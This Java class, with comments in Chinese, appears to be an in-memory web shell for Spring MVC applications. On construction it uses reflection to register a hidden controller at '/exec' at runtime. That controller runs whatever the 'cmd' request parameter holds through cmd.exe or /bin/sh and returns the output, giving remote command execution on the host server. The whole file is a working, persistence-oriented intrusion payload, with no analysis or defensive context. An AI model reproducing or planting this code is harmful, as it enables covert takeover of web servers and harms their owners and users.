import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.handler.AbstractHandlerMethodMapping;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.*;

public class InjectToController {

    static {
        System.out.println("test ......");
    }
    // 第一个构造函数
    public InjectToController() throws ClassNotFoundException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException, InvocationTargetException {
        System.out.println("gouzao ......");
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        // 可选步骤，判断url是否存在
        AbstractHandlerMethodMapping abstractHandlerMethodMapping = context.getBean(AbstractHandlerMethodMapping.class);
        Method method = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping").getDeclaredMethod("getMappingRegistry");
        method.setAccessible(true);
        Object  mappingRegistry = (Object) method.invoke(abstractHandlerMethodMapping);
        Field field = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry").getDeclaredField("urlLookup");
        field.setAccessible(true);
        Map urlLookup = (Map) field.get(mappingRegistry);
        Iterator urlIterator = urlLookup.keySet().iterator();
        List<String> urls = new ArrayList();
        while (urlIterator.hasNext()){
            String urlPath = (String) urlIterator.next();
            if ("/exec".equals(urlPath)){
                System.out.println("url已存在");
                return;
            }
        }
        // 可选步骤，判断url是否存在
        // 2. 通过反射获得自定义 controller 中test的 Method 对象
        Method method2 = InjectToController.class.getMethod("test");
        // 3. 定义访问 controller 的 URL 地址
        PatternsRequestCondition url = new PatternsRequestCondition("/exec");
        // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        // 5. 在内存中动态注册 controller
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
        // 创建用于处理请求的对象，加入“aaa”参数是为了触发第二个构造函数避免无限循环
        InjectToController injectToController = new InjectToController("aaa");
        mappingHandlerMapping.registerMapping(info, injectToController, method2);
    }
    // 第二个构造函数
    public InjectToController(String aaa) {}
    // controller指定的处理方法
    public void test() throws  IOException{
        // 获取request和response对象
        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
        // 获取cmd参数并执行命令
        System.out.println("cmd exec ......");
        //java.lang.Runtime.getRuntime().exec(request.getParameter("cmd"));

        //exec
        try {
            String arg0 = request.getParameter("cmd");
            System.out.println(arg0);
            PrintWriter writer = response.getWriter();
            if (arg0 != null) {
                String o = "";
                java.lang.ProcessBuilder p;
                if(System.getProperty("os.name").toLowerCase().contains("win")){
                    p = new java.lang.ProcessBuilder(new String[]{"cmd.exe", "/c", arg0});
                }else{
                    p = new java.lang.ProcessBuilder(new String[]{"/bin/sh", "-c", arg0});
                }
                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("\\A");
                o = c.hasNext() ? c.next(): o;
                c.close();
                writer.write(o);
                writer.flush();
                writer.close();
            }else{
                response.sendError(404);
            }
        }catch (Exception e){}
    }
}